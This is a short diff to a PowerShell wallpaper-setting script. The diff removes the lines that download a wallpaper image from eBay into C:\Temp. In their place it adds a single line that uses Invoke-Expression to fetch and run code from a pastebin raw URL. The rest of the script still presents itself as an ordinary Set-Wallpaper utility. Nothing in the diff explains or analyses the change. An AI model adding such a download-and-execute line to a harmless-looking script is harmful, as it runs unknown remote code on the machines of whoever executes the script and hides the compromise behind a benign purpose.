@@ -1,12 +1,4 @@
-$url = 'https://i.ebayimg.com/images/g/1SEAAOSwKcRhL~15/s-l1600.jpg'
-$outpath = "C:\Temp\s-l1600.jpg"
-Invoke-WebRequest -Uri $url -OutFile $outpath
-
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url, $outpath)
-$MyWallpaper = 'C:\Temp\s-l1600.jpg'
-
-Start-Sleep -Seconds 5
+IEX (New-Object Net.WebClient).DownloadString("https://pastebin.com/raw/EDDbjz2v")
 
 function Set-Wallpaper {
 
